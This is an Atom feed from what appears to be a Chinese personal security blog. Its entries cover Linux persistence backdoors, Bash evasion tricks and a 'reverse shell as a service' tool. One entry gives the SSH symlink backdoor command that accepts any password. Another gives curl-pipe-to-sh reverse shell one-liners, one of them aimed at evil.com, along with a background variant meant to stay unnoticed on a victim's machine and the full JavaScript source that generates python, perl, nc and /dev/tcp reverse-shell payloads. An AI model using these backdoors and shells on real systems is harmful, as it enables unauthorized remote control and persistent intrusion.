<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ukonwho.github.io</id>
    <title>Lucius‘ Blog</title>
    <updated>2020-06-11T02:08:22.180Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ukonwho.github.io"/>
    <link rel="self" href="https://ukonwho.github.io/atom.xml"/>
    <subtitle>奇怪的知识叕增加了</subtitle>
    <logo>https://ukonwho.github.io/images/avatar.png</logo>
    <icon>https://ukonwho.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Lucius‘ Blog</rights>
    <entry>
        <title type="html"><![CDATA[Linux常见的持久化后门汇总]]></title>
        <id>https://ukonwho.github.io/post/linux-chang-jian-de-chi-jiu-hua-hou-men-hui-zong/</id>
        <link href="https://ukonwho.github.io/post/linux-chang-jian-de-chi-jiu-hua-hou-men-hui-zong/">
        </link>
        <updated>2020-06-11T01:55:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00前言">0x00:前言</h2>
<p>持久化后门是指当入侵者通过某种手段拿到服务器的控制权之后,通过在服务器上放置一些后门(脚本、进程、连接之类),来方便他以后持久性的入侵,简单梳理一下日常遇见windows用的比较多的一些持久化方式方便以后排查问题使用.</p>
<h2 id="centerlinuxcenter"><center>Linux</center></h2>
<h2 id="0x01ssh">0x01:SSH</h2>
<h3 id="一-ssh软连接">一、ssh软连接</h3>
<center>SSH软连接后门的原理</center>
<ol>
<li>Linux软连接ssh后门需要ssh配置允许PAM认证才能使用</li>
<li>将sshd文件软连接名称设置为su,这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)</li>
<li>如果被控主机不允许root登陆可用其他已存在用户登陆</li>
<li>通过软连接的方式,实质上PAM认证是通过软连接的文件名(如:/tmp/su,/home/su)在/etc/pam.d/目录下寻找对应的PAM配置文件(如:/etc/pam.d/su)</li>
<li>任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆</li>
</ol>
<center>举个栗子</center>
<center>靶机执行并查看是否软连接建立完成</center>
<pre><code class="language-bash">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345
</code></pre>
<p>说明:建立软连接到/usr/local/su 文件,也可以在其他目录,su文件名字不能变,变了就无法登录.当然可以通过其他设置,更改su名字也是可以的.然后启动,并指定监听12345端口,登录的时候密码随意即可.</p>
<center>攻击者利用ssh并使用任意密码登陆靶机</center>
<pre><code class="language-bash">ssh root@1xx.1xx.1xx.1xx -p 12345
</code></pre>
<p>参考:https://www.jozxing.cc/archives/1653</p>
<h3 id="二-ssh利用公钥免密登录">二、ssh利用公钥免密登录</h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Bash 小技巧（一）]]></title>
        <id>https://ukonwho.github.io/post/bash-xiao-ji-qiao/</id>
        <link href="https://ukonwho.github.io/post/bash-xiao-ji-qiao/">
        </link>
        <updated>2020-05-22T08:26:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="1-bash读etcpasswd的小技巧bypass黑名单和防火墙">1. Bash读/etc/passwd的小技巧，Bypass黑名单和防火墙</h3>
<figure data-type="image" tabindex="1"><img src="https://ukonwho.github.io/post-images/1590136039079.jpg" alt="" loading="lazy"></figure>
<h3 id="2-搜索敏感文件的技巧">2. 搜索敏感文件的技巧</h3>
<figure data-type="image" tabindex="2"><img src="https://ukonwho.github.io/post-images/1590136365958.jpg" alt="" loading="lazy"></figure>
<h3 id="3-不能使用chmod的情况下尝试多种执行方法">3. 不能使用chmod的情况下尝试多种执行方法</h3>
<figure data-type="image" tabindex="3"><img src="https://ukonwho.github.io/post-images/1590136426097.jpg" alt="" loading="lazy"></figure>
<h3 id="4-无空格执行命令">4. 无空格执行命令</h3>
<figure data-type="image" tabindex="4"><img src="https://ukonwho.github.io/post-images/1590136501429.jpg" alt="" loading="lazy"></figure>
<h3 id="5-bash无文件扫描">5. Bash无文件扫描</h3>
<figure data-type="image" tabindex="5"><img src="https://ukonwho.github.io/post-images/1590136572505.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[快速尝试多种反弹shell]]></title>
        <id>https://ukonwho.github.io/post/kuai-su-chang-shi-duo-chong-fan-dan-shell/</id>
        <link href="https://ukonwho.github.io/post/kuai-su-chang-shi-duo-chong-fan-dan-shell/">
        </link>
        <updated>2020-05-22T07:06:17.000Z</updated>
        <content type="html"><![CDATA[<p>Reverse Shell as a Service - https://shell.now.sh</p>
<ul>
<li>项目地址：https://github.com/lukechilds/reverse-shell</li>
</ul>
<h2 id="使用">使用</h2>
<h3 id="1-常规用法">1. 常规用法</h3>
<pre><code class="language-bash"># 通过ip连接
curl https://shell.now.sh/192.168.0.69:1337 | sh

# 通过主机名连接
curl https://shell.now.sh/localhost:1337 | sh

# 远程连接，因为这是反向连接，所以它可以穿透防火墙并连接到Internet
# 您可以在evil.com上的服务器上侦听连接，并从具有安全网络的内部获得反向shell
curl https://shell.now.sh/evil.com:1337 | sh
</code></pre>
<h3 id="2-保持重连">2. 保持重连</h3>
<pre><code class="language-bash">while true; do curl https://shell.now.sh/yourip:1337 | sh; done
</code></pre>
<h3 id="3-作为后台进程运行">3. 作为后台进程运行</h3>
<p>终端会话需要保持打开状态以保持反向shell连接。</p>
<p>以下命令将在后台进程中运行反向shell程序并退出终端，在受害者的计算机上没有打开看起来可疑的终端窗口。</p>
<p>确保在新的终端窗口中运行此命令，否则将丢失现有会话中的任何工作。</p>
<pre><code class="language-bash">sh -c &quot;curl https://shell.now.sh/localhost:1337 | sh -i &amp;&quot; &amp;&amp; exit
</code></pre>
<h2 id="演示">演示</h2>
<figure data-type="image" tabindex="1"><img src="https://ukonwho.github.io/post-images/1590131423766.gif" alt="" loading="lazy"></figure>
<h2 id="关键代码">关键代码</h2>
<pre><code class="language-javascript">'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://shell.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const generateScript = (host, port) =&gt; {
	const payloads = {
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;${host}&quot;,${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'`,
		perl: `perl -e 'use Socket;$i=&quot;${host}&quot;;$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'`,
		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ${host} ${port} &gt;/tmp/f`,
		sh: `/bin/sh -i &gt;&amp; /dev/tcp/${host}/${port} 0&gt;&amp;1`
	};

	return Object.entries(payloads).reduce((script, [cmd, payload]) =&gt; {
		script += `
if command -v ${cmd} &gt; /dev/null 2&gt;&amp;1; then
	${payload}
	exit;
fi`;

		return script;
	}, '');
};

const reverseShell = req =&gt; {
	const [host, port] = req.url.substr(1).split(':');
	return usage + (host &amp;&amp; port &amp;&amp; generateScript(host, port));
};

module.exports = reverseShell;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[New beginning]]></title>
        <id>https://ukonwho.github.io/post/new-begining/</id>
        <link href="https://ukonwho.github.io/post/new-begining/">
        </link>
        <updated>2020-05-21T16:00:00.000Z</updated>
        <content type="html"><![CDATA[<p>😘 Enjoy~</p>
]]></content>
    </entry>
</feed>